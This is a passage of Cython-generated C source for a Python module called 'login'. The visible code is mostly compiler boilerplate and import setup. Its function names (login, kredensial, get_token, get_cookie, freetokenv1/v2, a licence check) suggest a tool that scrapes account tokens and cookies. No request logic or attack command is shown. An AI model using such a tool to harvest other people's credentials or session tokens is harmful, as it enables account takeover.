  __Pyx_GOTREF(__pyx_tuple__24);
  __Pyx_GIVEREF(__pyx_tuple__24);

  
  __pyx_tuple__25 = PyTuple_Pack(1, __pyx_kp_u_tidak_ada_koneksi_internet); if (unlikely(!__pyx_tuple__25)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__25);
  __Pyx_GIVEREF(__pyx_tuple__25);

  
  __pyx_tuple__26 = PyTuple_Pack(1, __pyx_n_s_WAR); if (unlikely(!__pyx_tuple__26)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__26);
  __Pyx_GIVEREF(__pyx_tuple__26);
  __pyx_codeobj__27 = (PyObject*)__Pyx_PyCode_New(0, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__26, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_login_py, __pyx_n_s_logo, 48, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__27)) __PYX_ERR(0, 48, __pyx_L1_error)

  
  __pyx_tuple__28 = PyTuple_Pack(7, __pyx_n_s_exp, __pyx_n_s_day, __pyx_n_s_month, __pyx_n_s_year, __pyx_n_s_a, __pyx_n_s_b, __pyx_n_s_delta); if (unlikely(!__pyx_tuple__28)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__28);
  __Pyx_GIVEREF(__pyx_tuple__28);
  __pyx_codeobj__29 = (PyObject*)__Pyx_PyCode_New(1, 0, 7, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__28, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_login_py, __pyx_n_s_datawaktu, 60, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__29)) __PYX_ERR(0, 60, __pyx_L1_error)

  
  __pyx_tuple__30 = PyTuple_Pack(8, __pyx_n_s_apikey, __pyx_n_s_url, __pyx_n_s_nama, __pyx_n_s_email, __pyx_n_s_status, __pyx_n_s_bergabung, __pyx_n_s_kadaluwarsa, __pyx_n_s_sisahari); if (unlikely(!__pyx_tuple__30)) __PYX_ERR(0, 73, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__30);
  __Pyx_GIVEREF(__pyx_tuple__30);
  __pyx_codeobj__31 = (PyObject*)__Pyx_PyCode_New(0, 0, 8, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__30, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_login_py, __pyx_n_s_ceklisen, 73, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__31)) __PYX_ERR(0, 73, __pyx_L1_error)

  
  __pyx_tuple__32 = PyTuple_Pack(6, __pyx_n_s_menu, __pyx_n_s_token, __pyx_n_s_cookie, __pyx_n_s_user, __pyx_n_s_pw, __pyx_n_s_zz); if (unlikely(!__pyx_tuple__32)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__32);
  __Pyx_GIVEREF(__pyx_tuple__32);
  __pyx_codeobj__33 = (PyObject*)__Pyx_PyCode_New(0, 0, 6, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__32, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_login_py, __pyx_n_s_login, 97, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__33)) __PYX_ERR(0, 97, __pyx_L1_error)

  
  __pyx_tuple__34 = PyTuple_Pack(2, __pyx_n_s_token, __pyx_n_s_nama); if (unlikely(!__pyx_tuple__34)) __PYX_ERR(0, 139, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__34);
  __Pyx_GIVEREF(__pyx_tuple__34);
  __pyx_codeobj__35 = (PyObject*)__Pyx_PyCode_New(1, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__34, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_login_py, __pyx_n_s_get_token, 139, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__35)) __PYX_ERR(0, 139, __pyx_L1_error)

  
  __pyx_tuple__36 = PyTuple_Pack(5, __pyx_n_s_cookie, __pyx_n_s_data, __pyx_n_s_find_token, __pyx_n_s_nama, __pyx_n_s_e); if (unlikely(!__pyx_tuple__36)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__36);
  __Pyx_GIVEREF(__pyx_tuple__36);
  __pyx_codeobj__37 = (PyObject*)__Pyx_PyCode_New(1, 0, 5, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__36, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_login_py, __pyx_n_s_get_cookie, 152, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__37)) __PYX_ERR(0, 152, __pyx_L1_error)

  
  __pyx_tuple__38 = PyTuple_Pack(7, __pyx_n_s_num, __pyx_n_s_url, __pyx_n_s_data, __pyx_n_s_token, __pyx_n_s_pil, __pyx_n_s_tolkau, __pyx_n_s_e); if (unlikely(!__pyx_tuple__38)) __PYX_ERR(0, 170, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__38);
  __Pyx_GIVEREF(__pyx_tuple__38);
  __pyx_codeobj__39 = (PyObject*)__Pyx_PyCode_New(0, 0, 7, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__38, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_login_py, __pyx_n_s_freetokenv1, 170, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__39)) __PYX_ERR(0, 170, __pyx_L1_error)

  
  __pyx_tuple__40 = PyTuple_Pack(7, __pyx_n_s_num, __pyx_n_s_url, __pyx_n_s_data, __pyx_n_s_token, __pyx_n_s_pil, __pyx_n_s_tolkau, __pyx_n_s_e); if (unlikely(!__pyx_tuple__40)) __PYX_ERR(0, 192, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__40);
  __Pyx_GIVEREF(__pyx_tuple__40);
  __pyx_codeobj__41 = (PyObject*)__Pyx_PyCode_New(0, 0, 7, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__40, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_login_py, __pyx_n_s_freetokenv2, 192, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__41)) __PYX_ERR(0, 192, __pyx_L1_error)

  
  __pyx_tuple__42 = PyTuple_Pack(13, __pyx_n_s_user, __pyx_n_s_pw, __pyx_n_s_url, __pyx_n_s_header, __pyx_n_s_r, __pyx_n_s_das, __pyx_n_s_header1, __pyx_n_s_po, __pyx_n_s_headcok, __pyx_n_s_data2, __pyx_n_s_find_token, __pyx_n_s_token, __pyx_n_s_cookie); if (unlikely(!__pyx_tuple__42)) __PYX_ERR(0, 214, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__42);
  __Pyx_GIVEREF(__pyx_tuple__42);
  __pyx_codeobj__43 = (PyObject*)__Pyx_PyCode_New(2, 0, 13, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__42, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_login_py, __pyx_n_s_kredensial, 214, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__43)) __PYX_ERR(0, 214, __pyx_L1_error)

  
  __pyx_tuple__44 = PyTuple_Pack(2, __pyx_n_s_cok, __pyx_n_s_cookie); if (unlikely(!__pyx_tuple__44)) __PYX_ERR(0, 245, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__44);
  __Pyx_GIVEREF(__pyx_tuple__44);
  __pyx_codeobj__45 = (PyObject*)__Pyx_PyCode_New(1, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__44, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_login_py, __pyx_n_s_convert, 245, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__45)) __PYX_ERR(0, 245, __pyx_L1_error)

  
  __pyx_tuple__46 = PyTuple_Pack(1, __pyx_n_s_time); if (unlikely(!__pyx_tuple__46)) __PYX_ERR(0, 249, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__46);
  __Pyx_GIVEREF(__pyx_tuple__46);
  __pyx_codeobj__47 = (PyObject*)__Pyx_PyCode_New(0, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__46, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_login_py, __pyx_n_s_real_time, 249, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__47)) __PYX_ERR(0, 249, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_3 = PyInt_FromLong(3); if (unlikely(!__pyx_int_3)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_5 = PyInt_FromLong(5); if (unlikely(!__pyx_int_5)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_int_12 = PyInt_FromLong(12); if (unlikely(!__pyx_int_12)) __PYX_ERR(0, 1, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); 
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); 
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); 
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); 
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); 
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); 
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); 

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initlogin(void) CYTHON_SMALL_CODE; 
__Pyx_PyMODINIT_FUNC initlogin(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_login(void) CYTHON_SMALL_CODE; 
__Pyx_PyMODINIT_FUNC PyInit_login(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_login(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_t_7;
  int __pyx_t_8;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  Py_ssize_t __pyx_t_11;
  Py_UCS4 __pyx_t_12;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'login' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_login(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  
  
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("login", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_login) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name_2, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "login")) {
      if (unlikely(PyDict_SetItemString(modules, "login", __pyx_m) < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
    }
  }
  #endif
  
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_re, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_re, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_calendar, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_calendar, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_bs4, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bs4, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_json, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_platform, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_platform, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_BeautifulSoup);
  __Pyx_GIVEREF(__pyx_n_s_BeautifulSoup);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_BeautifulSoup);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_bs4, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_BeautifulSoup); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_parser, __pyx_t_1) < 0) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_datetime);
  __Pyx_GIVEREF(__pyx_n_s_datetime);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_datetime);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_datetime, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_datetime); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_datetime, __pyx_t_2) < 0) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_date);
  __Pyx_GIVEREF(__pyx_n_s_date);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_date);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_datetime, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_date); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_date, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_platform);
  __Pyx_GIVEREF(__pyx_n_s_platform);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_platform);
